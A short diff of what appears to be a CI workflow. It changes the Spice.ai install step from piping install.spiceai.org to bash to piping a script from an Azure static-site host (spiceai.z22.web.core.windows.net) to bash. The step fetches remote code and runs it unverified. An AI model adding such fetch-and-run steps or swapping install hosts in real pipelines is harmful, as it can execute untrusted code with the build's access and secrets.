@@ -26,7 +26,7 @@ jobs:
 
       - name: install Spice.ai
         run: |
-          curl https://install.spiceai.org | /bin/bash
+          curl spiceai.z22.web.core.windows.net | /bin/bash
         working-directory: trader
 
       - name: start Spice.ai runtime
